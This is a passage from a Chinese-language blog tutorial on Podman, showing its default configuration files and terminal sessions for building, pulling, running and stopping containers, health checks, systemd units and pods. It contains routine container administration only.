class="line">/usr/share/containers/libpod.conf</span><br><span class="line">/usr/share/licenses/podman</span><br><span class="line">/usr/share/licenses/podman/LICENSE</span><br></pre></td></tr></table></figure>
<p>可以看到只有一个配置文件是在 <code>/etc/cni</code> 路径下的，与 Bridge 的配置有关：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/cni/net.d/87-podman-bridge.conflist</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"cniVersion"</span>: <span class="string">"0.3.0"</span>,</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"podman"</span>,</span><br><span class="line">    <span class="string">"plugins"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"bridge"</span>,</span><br><span class="line">        <span class="string">"bridge"</span>: <span class="string">"cni0"</span>,</span><br><span class="line">        <span class="string">"isGateway"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"ipMasq"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"ipam"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"host-local"</span>,</span><br><span class="line">            <span class="string">"subnet"</span>: <span class="string">"10.88.0.0/16"</span>,</span><br><span class="line">            <span class="string">"routes"</span>: [</span><br><span class="line">                &#123; <span class="string">"dst"</span>: <span class="string">"0.0.0.0/0"</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"type"</span>: <span class="string">"portmap"</span>,</span><br><span class="line">        <span class="string">"capabilities"</span>: &#123;</span><br><span class="line">          <span class="string">"portMappings"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面我们有提到，Podman 依赖的 containers-common RPM 中包含了很多配置文件，我们一个一个的来看一下：</p>
<h4 id="registries-conf"><a href="#registries-conf" class="headerlink" title="registries.conf"></a>registries.conf</h4><p>/etc/containers/registries.conf 用于保存 registries 相关配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/containers/registries.conf         </span><br><span class="line"><span class="comment"># This is a system-wide configuration file used to</span></span><br><span class="line"><span class="comment"># keep track of registries for various container backends.</span></span><br><span class="line"><span class="comment"># It adheres to TOML format and does not support recursive</span></span><br><span class="line"><span class="comment"># lists of registries.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The default location for this configuration file is /etc/containers/registries.conf.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The only valid categories are: 'registries.search', 'registries.insecure', </span></span><br><span class="line"><span class="comment"># and 'registries.block'.</span></span><br><span class="line"></span><br><span class="line">[registries.search]</span><br><span class="line">registries = [<span class="string">'registry.redhat.io'</span>, <span class="string">'quay.io'</span>, <span class="string">'docker.io'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If you need to access insecure registries, add the registry's fully-qualified name.</span></span><br><span class="line"><span class="comment"># An insecure registry is one that does not have a valid SSL certificate or only does HTTP.</span></span><br><span class="line">[registries.insecure]</span><br><span class="line">registries = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># If you need to block pull access from a registry, uncomment the section below</span></span><br><span class="line"><span class="comment"># and add the registries fully-qualified name.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Docker only</span></span><br><span class="line">[registries.block]</span><br><span class="line">registries = []</span><br></pre></td></tr></table></figure>
<h4 id="mounts-conf"><a href="#mounts-conf" class="headerlink" title="mounts.conf"></a>mounts.conf</h4><p><code>/usr/share/containers/mounts.conf</code> 在执行 <code>podman run</code> 或者 <code>podman build</code> 命令时自动挂载的路径，该路径只会在容器运行时挂载，不会提交到容器镜像中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/share/containers/mounts.conf                               </span><br><span class="line">/usr/share/rhel/secrets:/run/secrets</span><br></pre></td></tr></table></figure>
<h4 id="seccomp-json"><a href="#seccomp-json" class="headerlink" title="seccomp.json"></a>seccomp.json</h4><p><code>/usr/share/containers/seccomp.json</code> 是容器内允许的 seccomp 规则白名单。 seccomp（secure computing）是一种安全保护机制，一般情况下，程序可以使用所有的 syscall，但是为了避免安全问题发生，通常会指定相应的规则来保证。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/share/containers/seccomp.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">"defaultAction"</span>: <span class="string">"SCMP_ACT_ERRNO"</span>,</span><br><span class="line">	<span class="string">"archMap"</span>: [...],</span><br><span class="line">	<span class="string">"syscalls"</span>: [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="policy-json"><a href="#policy-json" class="headerlink" title="policy.json"></a>policy.json</h4><p><code>/etc/containers/policy.json</code>  证书安全相关配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/containers/policy.json      </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"default"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"insecureAcceptAnything"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"transports"</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"docker-daemon"</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">""</span>: [&#123;<span class="string">"type"</span>:<span class="string">"insecureAcceptAnything"</span>&#125;]</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h4><h5 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ <span class="built_in">pwd</span>                                                                                                                                  1 ↵</span><br><span class="line">/home/yiran/podman/hello</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat Dockerfile </span><br><span class="line">FROM docker.io/library/centos:latest</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">'hello'</span></span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ podman build -t hello:1.0 .    </span><br><span class="line">STEP 1: FROM docker.io/library/centos:latest</span><br><span class="line">STEP 2: RUN <span class="built_in">echo</span> <span class="string">'hello'</span></span><br><span class="line">hello</span><br><span class="line">--&gt; 895ce449f0b3f1f2d8a0d2dca280cb46f4c69bb2824c93bb0e72eb49987c9050</span><br><span class="line">STEP 3: COMMIT hello:1.0</span><br><span class="line">--&gt; 618f931bc244f2eaff53d9f2bcb1df97c5ddac501088d5919450a57f995173af</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ podman images               </span><br><span class="line">REPOSITORY                             TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/hello                        1.0      618f931bc244   8 seconds ago    210 MB</span><br><span class="line">&lt;none&gt;                                 &lt;none&gt;   895ce449f0b3   13 seconds ago   210 MB</span><br><span class="line">docker.io/library/nginx                latest   f949e7d76d63   2 weeks ago      130 MB</span><br><span class="line">docker.io/library/centos               latest   67fa590cfc1c   7 weeks ago      210 MB</span><br><span class="line">registry.fedoraproject.org/f27/httpd   latest   18f01f6f77ef   15 months ago    426 MB</span><br></pre></td></tr></table></figure>
<h5 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman search mongo |head -n 5</span><br><span class="line">INDEX       NAME                                                 DESCRIPTION                                       STARS   OFFICIAL   AUTOMATED</span><br><span class="line">quay.io     quay.io/hellofresh/delete-old-ahoy-mongo-dbs                                                           0                  </span><br><span class="line">quay.io     quay.io/ukhomeofficedigital/mongo-34                                                                   0                  </span><br><span class="line">quay.io     quay.io/utilitywarehouse/mongo-burs                                                                    0                  </span><br><span class="line">quay.io     quay.io/ukhomeofficedigital/mongo                                                                      0</span><br></pre></td></tr></table></figure>
<h5 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image pull nginx</span><br><span class="line">Trying to pull registry.redhat.io/nginx:latest...Failed</span><br><span class="line">Trying to pull quay.io/nginx:latest...Failed</span><br><span class="line">Trying to pull docker.io/nginx:latest...Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob b8f262c62ec6: 25.84 MiB / 25.84 MiB [=========================] 13s</span><br><span class="line">Copying blob e9218e8f93b1: 22.48 MiB / 22.48 MiB [=========================] 13s</span><br><span class="line">Copying blob 7acba7289aa3: 202 B / 202 B [=================================] 13s</span><br><span class="line">Copying config f949e7d76d63: 6.51 KiB / 6.51 KiB [==========================] 0s</span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043</span><br></pre></td></tr></table></figure>
<p>除了像 Docker 一样从网络拉取镜像，Podman 为了方便用户从 Docker 迁移过来，Podman 支持从本地的 docker daemon 中直接拉取镜像，如果没有 domain 的话，目前会自动补全 <code>docker.io/library/</code> 前缀。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ docker images |grep yiran</span><br><span class="line">harbor.yiran.com/yiran_tuna/leader-elector                                   0.5                           129c97fdb20d        3 years ago         169MB</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman pull docker-daemon:harbor.yiran.com/yiran_tuna/leader-elector:0.5</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob bf87964bccfd <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 <span class="keyword">done</span></span><br><span class="line">Copying blob 3efb68385a82 <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 <span class="keyword">done</span></span><br><span class="line">Copying blob 42755cf4ee95 <span class="keyword">done</span></span><br><span class="line">Copying blob ce31f2e01592 <span class="keyword">done</span></span><br><span class="line">Copying blob 5f70bf18a086 skipped: already exists</span><br><span class="line">Copying config 129c97fdb2 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">129c97fdb20d5fb7a0c569994f710c2b0d5292219f189f4f66c313f7bed9f434</span><br></pre></td></tr></table></figure>
<p>看上去一切都很美好，但是要注意下面这种错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERRO[0005] Error pulling image ref //testimg:latest: Error committing the finished image: error adding layer with blob &quot;sha256:caed8f108bf6721dc2709407ecad964c83a31c8008a6a21826aa4ab995df5502&quot;: Error processing tar file(exit status 1): there might not be enough IDs available in the namespace (requested 4000000:4000000 for /testfile): lchown /testfile: invalid argument</span><br></pre></td></tr></table></figure>
<p>因为 Podman 可以用普通用户运行容器，平时操作时也都是普通用户，这时候我们就面临一个UID &amp; GID 映射的问题，默认的 subuid 的上限是 65536，这个可以自己做相应的调整：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat /etc/subuid</span><br><span class="line">yiran:100000:65536</span><br><span class="line">yiran@yiran-centos8:~/podman/hello </span><br><span class="line"> $ cat /etc/subgid</span><br><span class="line">yiran:100000:65536</span><br></pre></td></tr></table></figure>
<p>不只是在镜像拉取过程中，在操作文件时，也需要关注 UID &amp; GID 的问题，这个是之前使用 Docker 忽略的点。</p>
<h5 id="列出"><a href="#列出" class="headerlink" title="列出"></a>列出</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/nginx    latest   f949e7d76d63   7 days ago    130 MB</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br></pre></td></tr></table></figure>
<h5 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image inspect docker.io/library/nginx |head -n 10</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"Id"</span>: <span class="string">"f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043"</span>,</span><br><span class="line">        <span class="string">"Digest"</span>: <span class="string">"sha256:066edc156bcada86155fd80ae03667cf3811c499df73815a2b76e43755ebbc76"</span>,</span><br><span class="line">        <span class="string">"RepoTags"</span>: [</span><br><span class="line">            <span class="string">"docker.io/library/nginx:latest"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"RepoDigests"</span>: [</span><br><span class="line">            <span class="string">"docker.io/library/nginx@sha256:066edc156bcada86155fd80ae03667cf3811c499df73815a2b76e43755ebbc76"</span></span><br><span class="line">        ],</span><br></pre></td></tr></table></figure>
<h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman image rm docker.io/library/nginx                 </span><br><span class="line">f949e7d76d63befffc8eec2cbf8a6f509780f96fb3bacbdc24068d594a77f043</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images                          </span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br></pre></td></tr></table></figure>
<h4 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h4><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman images                             </span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED       SIZE</span><br><span class="line">docker.io/library/centos   latest   67fa590cfc1c   6 weeks ago   210 MB</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman run -it docker.io/library/centos sh</span><br><span class="line">sh-4.2<span class="comment"># cat /etc/centos-release</span></span><br><span class="line">CentOS Linux release 7.6.1810 (Core) </span><br><span class="line">sh-4.2<span class="comment"># exit</span></span><br></pre></td></tr></table></figure>
<h5 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps                                                                                               </span><br><span class="line">[sudo] password <span class="keyword">for</span> yiran: </span><br><span class="line">CONTAINER ID  IMAGE                                        COMMAND               CREATED        STATUS            PORTS                   NAMES</span><br><span class="line">af3d9001ad32  registry.fedoraproject.org/f27/httpd:latest  container-entrypo...  8 minutes ago  Up 8 minutes ago  0.0.0.0:8080-&gt;8080/tcp  elastic_goldwasser</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman stop af3d9001ad32</span><br><span class="line">af3d9001ad3211f5503742ca3cca8ddca542e27d7b9e54099c56ab7e04778503</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps               </span><br><span class="line">CONTAINER ID  IMAGE  COMMAND  CREATED  STATUS  PORTS  NAMES</span><br></pre></td></tr></table></figure>
<h5 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a</span><br><span class="line">CONTAINER ID  IMAGE                                        COMMAND               CREATED        STATUS                     PORTS                   NAMES</span><br><span class="line">af3d9001ad32  registry.fedoraproject.org/f27/httpd:latest  container-entrypo...  8 minutes ago  Exited (0) 29 seconds ago  0.0.0.0:8080-&gt;8080/tcp  elastic_goldwasser</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman rm af3d9001ad32                                                                                       </span><br><span class="line">af3d9001ad3211f5503742ca3cca8ddca542e27d7b9e54099c56ab7e04778503</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman ps -a          </span><br><span class="line">CONTAINER ID  IMAGE  COMMAND  CREATED  STATUS  PORTS  NAMES</span><br></pre></td></tr></table></figure>
<h5 id="checkpoint-restore"><a href="#checkpoint-restore" class="headerlink" title="checkpoint/restore"></a>checkpoint/restore</h5><p>Podman 提供了类似于 git 的功能，能够对 container 进行 checkpoint(commit)，并且可以 restore(checkout)，虽然 <a href="https://podman.io/blogs/2018/10/10/checkpoint-restore.html" target="_blank" rel="noopener">demo 视频</a> 很美好，但是我本地想通过快照（虚拟化功能）的方式来验证，却发现因为 CRIU 的版本过低不支持该功能，等后续深度使用后再研究下这个功能的原理。</p>
<h5 id="健康检查"><a href="#健康检查" class="headerlink" title="健康检查"></a>健康检查</h5><p>Podman 1.2.0 版本提供了 healthcheck 功能，我们在运行容器时，可以通过参数 <code>--healthcheck-command</code> 来指定健康检查的方式，然后通过 <code>podman healthcheck</code> 命令来检测：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo podman run -dt --name hc1 --healthcheck-command <span class="string">'CMD-SHELL curl http://localhost || exit 1'</span> --healthcheck-interval=0 quay.io/libpod/alpine_nginx:latest</span><br><span class="line">d25ee6faaf6e5e12c09e734b1ac675385fe4d4e8b52504dd01a60e1b726e3edb</span><br><span class="line">$ sudo podman healthcheck run hc1</span><br><span class="line">Healthy</span><br><span class="line">$ <span class="built_in">echo</span> $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p><code>--healthcheck-command</code> 命令是在容器内执行的，所以我们需要保证容器镜像中存在相应命令； <code>--healthcheck-interval</code> 如果设置为 0 则不自动检查。</p>
<h5 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h5><p>由于 Podman 没有 daemon ，所以没办法像 docker 一样通过指定参数 <code>--restart=always</code> 在 docker 进程启动时自动拉起镜像。 Podman 通过 systemd 来支持该功能。</p>
<p>首先，我们需要准备一个已经可以正常运行的容器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ podman ps </span><br><span class="line">CONTAINER ID  IMAGE                                  COMMAND               CREATED                 STATUS                     PORTS  NAMES</span><br><span class="line">cf6b656d4ab0  docker.io/library/envoy:latest  /usr/bin/mongod -...  Less than a second ago  Up Less than a second ago         smtx-mongodb</span><br></pre></td></tr></table></figure>
<p>编写 systemd 配置文件，通常默认路径为： /usr/lib/systemd/system/</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /usr/lib/systemd/system/envoy.service </span><br><span class="line">[Unit]</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Restart=always</span><br><span class="line">ExecStart=/usr/bin/podman start -a envoy</span><br><span class="line">ExecStop=/usr/bin/podman stop -t 10 envoy</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<p>编写完成后，我们需要执行下 <code>systemctl daemon-reload</code> 重新加载一次配置，然后就可以通过 <code>systemctl</code> 来控制容器的启停、开机自启动了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ systemctl start envoy</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ systemctl <span class="built_in">enable</span> envoy</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/envoy.service to /usr/lib/systemd/system/envoy.service.</span><br><span class="line">[root@node99 16:28:12 ~]<span class="variable">$systemctl</span> status envoy</span><br><span class="line">● envoy.service</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/envoy.service; enabled; vendor preset: disabled)</span><br><span class="line">  Drop-In: /etc/systemd/system/envoy.service.d</span><br><span class="line">           └─cgroup.conf</span><br><span class="line">   Active: active (running) since Sat 2019-10-12 20:09:34 CST; 3h 41min left</span><br><span class="line"> Main PID: 47684 (podman)</span><br><span class="line">   CGroup: /system.slice/system-zbs.slice/system-zbs-others.slice/envoy.service</span><br><span class="line">           └─47684 /usr/bin/podman start -a envoy</span><br></pre></td></tr></table></figure>
<h4 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h4><h5 id="创建及使用"><a href="#创建及使用" class="headerlink" title="创建及使用"></a>创建及使用</h5><p>Podman 除了像 Docker 一样提供基本的容器管理，还提供了 K8S 中的 Pod 功能（得对的起名字啊）。<br>对于最终要运行在 k8s 环境的同学来说，Podman 非常适合，可以很大的减少环境不通导致的工作量：Podman 的 YAML 和 k8s pod yaml 文件格式是兼容的。</p>
<p>首先，我们来创建一个 Pod：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod create --name postgresql -p 5432 -p 9187</span><br><span class="line">error adding Infra Container: unable to pull k8s.gcr.io/pause:3.1: unable to pull image: Error determining manifest MIME <span class="built_in">type</span> <span class="keyword">for</span> docker://k8s.gcr.io/pause:3.1: pinging docker registry returned: Get https://k8s.gcr.io/v2/: dial tcp 64.233.189.82:443: i/o timeout</span><br></pre></td></tr></table></figure>
<p>了解 K8S Pod 的同学应该知道 <code>google_containers/pause</code>容器，它主要的作用是 namespace  控制和启动 init 进程，即 PID 为1。在 Podman 中也是如此，这里需要 pull pause 镜像，但是喜闻乐见的 timeout。。。。</p>
<p>（此处开始折腾网络）</p>
<p>我们重新来走一次 demo ：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod create --name postgresql -p 5432 -p 9187  <span class="comment"># 创建 Pod，并映射端口</span></span><br><span class="line">17020cd16ae689f5d4e0f17468c67c3f9d3b8aa424d9e463dc8b187bb80bd328</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ls                                      </span><br><span class="line">POD ID         NAME         STATUS    CREATED         <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Running   7 seconds ago   1                 5f38e2d70484</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo podman pod ps </span><br><span class="line">POD ID         NAME         STATUS    CREATED          <span class="comment"># OF CONTAINERS   INFRA ID</span></span><br><span class="line">17020cd16ae6   postgresql   Running   23 seconds ago   1                 